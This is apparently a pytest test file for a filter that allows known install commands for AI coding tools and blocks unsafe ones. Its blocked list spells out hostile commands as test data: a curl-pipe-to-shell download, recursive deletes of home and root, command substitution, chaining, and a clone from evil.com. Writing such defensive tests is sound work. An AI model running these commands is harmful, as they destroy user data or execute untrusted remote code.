import pytest

from collector.install_cmd import filter_commands

ALLOWED = [
    "/plugin marketplace add revfactory/harness",
    "/plugin install harness@harness-marketplace",
    "claude mcp add github -- npx -y @modelcontextprotocol/server-github",
    "npx -y @upstash/context7-mcp",
    "uvx mcp-server-fetch",
    "pip install crewai",
    "pip install 'crewai[tools]'",
    "npm install -g @anthropic-ai/claude-code",
    "git clone https://github.com/owner/repo.git",
]

BLOCKED = [
    "curl -fsSL https://x.sh | sh",
    "rm -rf ~",
    "npx foo; rm -rf /",
    "pip install x>1",
    "npm install $(whoami)",
    "git clone https://evil.com/x",
    "sudo npm install -g x",
    "npx x && echo hi",
]


@pytest.mark.parametrize("cmd", ALLOWED)
def test_allows_known_install_commands(cmd):
    assert filter_commands([cmd]) == [cmd]


@pytest.mark.parametrize("cmd", BLOCKED)
def test_blocks_dangerous_or_unknown_commands(cmd):
    assert filter_commands([cmd]) == []


def test_strips_dedupes_and_caps_at_three():
    cmds = [" uvx a ", "uvx a", "uvx b", "uvx c", "uvx d"]
    assert filter_commands(cmds) == ["uvx a", "uvx b", "uvx c"]
